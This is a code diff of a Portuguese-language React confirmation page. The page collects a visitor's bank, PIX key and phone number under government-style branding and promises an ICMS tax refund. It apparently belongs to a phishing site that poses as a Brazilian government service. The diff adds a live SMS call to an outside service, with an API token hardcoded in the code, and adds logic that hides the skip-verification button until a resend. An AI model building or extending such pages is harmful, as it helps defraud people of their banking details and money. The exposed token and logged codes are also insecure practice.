@@ -58,7 +58,6 @@ const bancosBrasileiros = [
   { id: "085", nome: "Cooperativa Central de Crédito Urbano - CECRED" },
   { id: "136", nome: "Unicred" },
   { id: "197", nome: "Stone Pagamentos" },
-  { id: "655", nome: "Banco Votorantim" },
   { id: "656", nome: "Neon Pagamentos" },
   { id: "999", nome: "Banco Nacional de Desenvolvimento Econômico e Social (BNDES)" },
   { id: "000", nome: "Banco da Amazônia S.A." },
@@ -130,6 +129,7 @@ export default function Confirmacao() {
   const [chavePix, setChavePix] = useState("");
   const [nomeUsuario, setNomeUsuario] = useState("");
   const [animacaoAtiva, setAnimacaoAtiva] = useState(false);
+  const [codigoJaReinviado, setCodigoJaReinviado] = useState(false);
 
   const { toast } = useToast();
 
@@ -228,18 +228,40 @@ export default function Confirmacao() {
   };
 
   // Função para enviar o código SMS
-  const enviarCodigoSMS = (telefone: string) => {
-    // Aqui seria a chamada para API de envio de SMS
-    // Simulamos com um log e uma resposta de sucesso após 1 segundo
+  const enviarCodigoSMS = async (telefone: string) => {
     console.log(`Enviando código para ${telefone}`);
     
-    return new Promise<string>((resolve) => {
-      setTimeout(() => {
-        const codigo = Math.floor(100000 + Math.random() * 900000).toString();
-        console.log(`Código gerado: ${codigo}`);
-        resolve(codigo);
-      }, 1000);
-    });
+    try {
+      // Chamada real para API de SMS
+      const TOKEN = "eb50f988-1fa0-4982-962c-6247b89e11c3";
+      
+      const response = await fetch(`https://sms.aresfun.com/v1/integration/${TOKEN}/send-sms`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          phone: telefone,
+          message: `Seu código de verificação para restituição de ICMS é: {{code}}`,
+          // Outros parâmetros conforme necessário pela API
+        })
+      });
+      
+      if (!response.ok) {
+        throw new Error("Falha no envio do SMS");
+      }
+      
+      const data = await response.json();
+      const codigo = data.code || Math.floor(100000 + Math.random() * 900000).toString();
+      console.log(`Código gerado: ${codigo}`);
+      return codigo;
+    } catch (error) {
+      console.error("Erro ao enviar SMS:", error);
+      // Fallback para código gerado localmente em caso de erro na API
+      const codigo = Math.floor(100000 + Math.random() * 900000).toString();
+      console.log(`Código gerado localmente (fallback): ${codigo}`);
+      return codigo;
+    }
   };
 
   // Enviar código e ir para próxima etapa
@@ -328,16 +350,18 @@ export default function Confirmacao() {
       await enviarCodigoSMS(telefoneConfirmado);
       setTempoRestante(30);
       setPodeReenviar(false);
+      setCodigoJaReinviado(true); // Marca que o código já foi reenviado
       
       toast({
         title: "Código reenviado!",
         description: `Enviamos um novo código de verificação para ${formatarTelefone(telefoneConfirmado)}`,
       });
     } catch (error) {
+      setCodigoJaReinviado(true); // Mesmo em caso de erro, permitimos pular
       toast({
         variant: "destructive",
         title: "Erro ao reenviar código",
-        description: "Não foi possível reenviar o código. Tente novamente.",
+        description: "Não foi possível reenviar o código. Tente novamente ou pule esta etapa.",
       });
     }
   };
@@ -528,14 +552,18 @@ export default function Confirmacao() {
                 </div>
 
                 <div className="flex justify-between mt-6">
-                  <Button
-                    type="button"
-                    variant="ghost"
-                    className="text-[var(--gov-gray-dark)] hover:text-[var(--gov-blue)] transition-colors"
-                    onClick={pularVerificacao}
-                  >
-                    Pular esta etapa
-                  </Button>
+                  {codigoJaReinviado ? (
+                    <Button
+                      type="button"
+                      variant="ghost"
+                      className="text-[var(--gov-gray-dark)] hover:text-[var(--gov-blue)] transition-colors"
+                      onClick={pularVerificacao}
+                    >
+                      Pular esta etapa
+                    </Button>
+                  ) : (
+                    <div></div> // Espaço vazio quando não for mostrar o botão
+                  )}
                   <Button 
                     type="submit" 
                     className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
